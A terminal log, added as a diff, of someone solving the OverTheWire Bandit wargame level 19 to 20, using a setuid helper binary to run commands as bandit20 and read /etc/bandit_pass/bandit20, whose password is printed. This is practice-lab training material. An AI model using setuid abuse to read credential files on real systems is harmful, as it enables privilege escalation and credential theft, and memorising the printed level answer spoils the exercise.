@@ -1,0 +1,36 @@
+┌─[root@parrot]─[/tmp]
+└──╼ #ssh bandit19@bandit.labs.overthewire.org -p 2220    
+
+bandit19@bandit:~$ ls
+bandit20-do
+bandit19@bandit:~$ setuid
+-bash: setuid: command not found
+bandit19@bandit:~$ file bandit20-do 
+bandit20-do: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8e941f24b8c5cd0af67b22b724c57e1ab92a92a1, not stripped
+bandit19@bandit:~$ ./bandit20-do 
+Run a command as another user.
+  Example: ./bandit20-do id
+bandit19@bandit:~$ ./bandit20-do 19
+env: ‘19’: No such file or directory
+bandit19@bandit:~$ ls -a
+.  ..  bandit20-do  .bash_logout  .bashrc  .profile
+bandit19@bandit:~$ ./bandit20-do id
+uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)
+bandit19@bandit:~$ ./bandit20-do /etc/bandit_pass
+env: ‘/etc/bandit_pass’: Permission denied
+bandit19@bandit:~$ ./bandit20-do id/etc/bandit_pass
+env: ‘id/etc/bandit_pass’: No such file or directory
+bandit19@bandit:~$ ./bandit20-do id /etc/bandit_pass
+id: ‘/etc/bandit_pass’: no such user
+bandit19@bandit:~$ id
+uid=11019(bandit19) gid=11019(bandit19) groups=11019(bandit19)
+bandit19@bandit:~$ ./bandit20-do whoami
+bandit20
+bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass
+cat: /etc/bandit_pass: Is a directory
+bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit19
+cat: /etc/bandit_pass/bandit19: Permission denied
+bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+bandit19@bandit:~$ 
+
